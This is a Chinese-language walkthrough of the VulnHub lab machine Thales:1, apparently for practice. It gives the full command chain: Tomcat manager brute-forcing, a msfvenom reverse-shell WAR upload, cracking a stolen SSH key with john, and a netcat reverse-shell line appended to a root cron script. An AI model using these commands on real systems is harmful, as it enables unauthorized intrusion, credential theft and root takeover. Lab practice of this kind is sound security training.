靶场搭建

靶机下载地址：Thales: 1 ~ VulnHub

下载后使用 VirtualBox 导入（VMware 可能存在兼容问题），网络设置为 NAT 模式。攻击机使用 Kali Linux。

信息收集

主机发现
arp-scan -l
端口扫描
nmap --min-rate 10000 -p- 192.168.21.135
版本扫描
nmap -sV -sT -O -p22,8080 192.168.21.135

开放端口：22（SSH）、8080（Tomcat 9.0.52）。

Tomcat 渗透

后台爆破

访问 8080 端口，发现是 Tomcat 默认页面，存在 Manager App 后台。使用 msf 辅助模块爆破：

msfconsole
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 192.168.21.135
run

成功获取凭证：tomcat:role1。

WAR 后门上传

使用 msfvenom 生成反弹 Shell 的 WAR 包：

msfvenom -p java/shell/reverse_tcp lhost=192.168.21.131 lport=666 -f war -o shell.war

登录 Tomcat Manager App，在 WAR file to deploy 处上传 shell.war。

获取 Shell

本地开启监听：

nc -lvp 666

访问上传的 WAR 包路径，触发反弹 Shell。获取到低权限 Shell 后，升级为交互式：

python3 -c 'import pty;pty.spawn("/bin/bash")'

SSH 私钥破解

私钥发现

在 /home/thales/.ssh/ 目录下发现 SSH 私钥 id_rsa：

cat /home/thales/.ssh/id_rsa

将私钥内容保存到本地 Kali 的 id_rsa 文件中。

john 爆破

使用 ssh2john 转换格式并用 rockyou 字典爆破：

/usr/share/john/ssh2john.py id_rsa > crack.txt
john --wordlist=/usr/share/wordlists/rockyou.txt crack.txt

成功破解出密码：vodka06。

切换 thales 用户

在反弹 Shell 中切换用户：

su thales

查看 user.txt 获取第一个 flag。同时发现 /home/thales/notes.txt 提供了提权线索。

权限提升

backup.sh 定时任务

根据 notes.txt 的提示，查看 /usr/local/bin/backup.sh：

cat /usr/local/bin/backup.sh

该文件由 root 定时执行，且 thales 用户拥有读写执行权限。在其中添加反弹 Shell：

echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.21.131 1235 >/tmp/f" >> /usr/local/bin/backup.sh
反弹 Shell 获 root

本地监听等待定时任务触发：

nc -lvp 1235

成功接收到 root 权限的反弹 Shell。

Flag

获取 root 权限后读取 /root/root.txt 完成渗透。
